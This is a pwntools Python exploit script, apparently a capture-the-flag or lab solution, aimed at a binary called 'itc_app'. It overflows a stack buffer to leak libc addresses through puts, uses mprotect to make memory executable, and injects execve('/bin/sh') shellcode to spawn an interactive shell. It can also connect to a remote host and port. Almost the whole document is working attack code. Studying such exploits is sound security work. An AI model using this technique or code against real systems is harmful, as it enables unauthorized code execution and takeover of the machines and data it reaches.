from pwn import *

# Allows you to switch between GDB/Remote/Local.
# Usage: python3 this_script.py GDB
#        python3 this_script.py REMOTE <ip> <port>
#        python3 this_script.py 
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# GDB script that is used for debugging.
gdbscript = '''
break main
continue
'''.format(**locals())

# Setting the path to executable.
exe = './itc_app'

# The context arch, bits, os and other.
elf = ELF(exe, checksec=False)

# Enable verbose logging (info/debug).
context.log_level = 'info'



###################################################################################################################################
# EXPLOIT
###################################################################################################################################

# Start program
io = start()

# Offset to RIP
offset = 132

# All addresses formatted using [::-1] to be in little endian form.
gets_plt = b"\x08\x04\x83\x30"[::-1]    #Address of gets@plt.
puts_plt = b"\x08\x04\x83\x40"[::-1]    #Address of puts@plt.
main = b"\x08\x04\x84\x7b"[::-1]        #Address of Main for puts function to return to.
puts_got = b"\x08\x04\x97\xac"[::-1]    #Address of puts@got.

# Payload to leak libc function.
# flat() is used to flatten all of the arguments into a string. Thus creating a single, string payload.
leak_payload = flat(
    b"\x90"*offset,    # Offset to the EIP.
    puts_plt,          # Address of puts@plt for puts function to be executed.
    main,              # Address of main to return to after puts completes.
    puts_got,          # Parameter 1: Address of the function pointer to the entry of puts in the GOT.
)

# Send the first payload to leak the address of "puts" after the user is prompted to provide input.
io.sendlineafter(b'Enter your Description\n', leak_payload)

# Receive all lines sent back to user until the required one, that contains the leaked addresses. 
# https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recvlines
io.recvlines(3)

# Receive the line which contains the "puts" address and other addresses from the GOT.
# The functions of leaked addresses after "puts" were correlated using gdb.   
# https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
leaked_addresses = (io.recvline(False))    # "False" truncates the end nullbyte.
puts = (leaked_addresses[:4])
libc_start_main = (leaked_addresses[4:8])
setvbuf = (leaked_addresses[8:12])

# Calculate the beginning of libc using the obtained offsets from the libc database.
beginning_libc_int = (int.from_bytes(libc_start_main, 'little') - 0x018550)
beginning_libc_bytes = beginning_libc_int.to_bytes(4, 'little')

print("-"*10,"Leaked Addresses","-"*10)
print("> Address of puts:", puts[::-1].hex())
print("> Address of libc_start_main:", libc_start_main[::-1].hex())
print("> Address of setvbuf:", setvbuf[::-1].hex())
print("\n> Beginning of libc:", beginning_libc_bytes[::-1].hex())
print("-"*38)



# Changing memory page permissions.
# Calculate the address of mprotect in libc to modify page permissions.
mprotect = (beginning_libc_int + 0xe2ec0).to_bytes(4, 'little')    # (4 bytes, little endian).

rwx_payload = flat(
    b"\x90"*offset,          # Offset to the EIP.
    mprotect,                # Calculated address of mprotect in libc.
    main,                    # Address of main to return to after mprotect completes.
    beginning_libc_bytes,    # Parameter 1: Address of memory whose permissions will be changed (page-boundary aligned).
    0x1000,                  # Parameter 2: Length of the memory region to change: 4096 bytes (in hex).
    0x7,                     # Parameter 3: A flag denoting new permissions: Read-Write-Execute.
)

# Send the payload to modify memory access permissions after the user is prompted to provide input.
io.sendlineafter(b'Enter your Description\n', rwx_payload)
print("> Changed memory page permissions.")
print("-"*38)



# Shellcode injection.
shellcode_payload = flat(
    b"\x90"*offset,          # Offset to the EIP.
    gets_plt,                # Address of gets@plt.
    beginning_libc_bytes,    # Address of the beginning of libc (as calculated above) to return to after gets completes.
    beginning_libc_bytes,    # Parameter 1: Address of the beginning of libc (as calculated above) to which shellcode will be injected.
)

# Send shellcode.
io.sendlineafter(b'Enter your Description\n', shellcode_payload)

# Linux x86 execve("/bin/sh") shellcode - 28 bytes.
# Created by Jean Pascal Pereira; 
# https://shell-storm.org/shellcode/files/shellcode-811.html
# The shellcode is sent through stdin as input for the gets() function that's executed by the third payload.
io.sendline(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")

print("> Shellcode sent.")
print("-"*38)



# Got Shell?
io.interactive()